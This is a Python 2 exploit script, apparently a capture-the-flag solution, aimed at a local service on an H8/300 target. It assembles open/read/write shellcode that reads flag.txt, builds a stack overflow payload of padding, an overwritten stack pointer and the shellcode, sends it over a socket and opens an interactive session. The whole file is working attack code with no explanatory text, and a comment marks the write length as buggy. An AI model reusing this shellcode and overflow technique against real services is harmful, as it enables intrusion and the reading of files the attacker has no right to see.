asm = '''.section .text
.global _start

.ascii "%s"
_start:
    bsr pc
    mov.w @sp, r5
    add.b #44,r5l
    xor.w r6, r6
open:
    mov.w r5, r0
    mov.w r6, r1
    mov.w r6, r2
    mov.w	r1, @-sp
    subs	#2, sp
    .long (0x5e000000 | (0xc5))
read:
    mov.w r5, r1
    mov.w #0x7f, r2
    .long (0x5e000000 | (0xc6))
write:
    mov.w #1, r0
    mov.w r5, r1
    # buggy
    mov.w #0x16, r2
    .long (0x5e000000 | (0xc7))
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'h8300'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10001
s = mysock(IP, PORT)
s.send('\n000')
SP = 0x1b0e
shellcode = 'A' * 16 + p16b(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)

